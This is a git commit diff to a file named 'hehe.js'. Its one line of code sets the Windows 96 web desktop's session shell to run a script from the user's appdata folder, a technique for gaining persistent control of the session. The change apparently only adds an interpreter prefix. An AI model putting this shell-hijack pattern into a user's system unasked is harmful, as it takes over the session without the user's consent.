c5c766c77579bcbac80d9d8141245cf7e07fa44e
TermOfficial <79934414+TermOfficial@users.noreply.github.com>
2023-04-11 17:10:42 -0400

    aaaaa

--- hehe.js
+++ hehe.js
@@ -1,1 +1,1 @@
-const fs = w96.FS;const { sysConf: SCM } = w96;SCM.set("System/Session/Shell/exec","c:/user/appdata/z.wrt");await SCM.syncRoot("System");
+const fs = w96.FS;const { sysConf: SCM } = w96;SCM.set("System/Session/Shell/exec","wjs c:/user/appdata/z.wrt");await SCM.syncRoot("System");
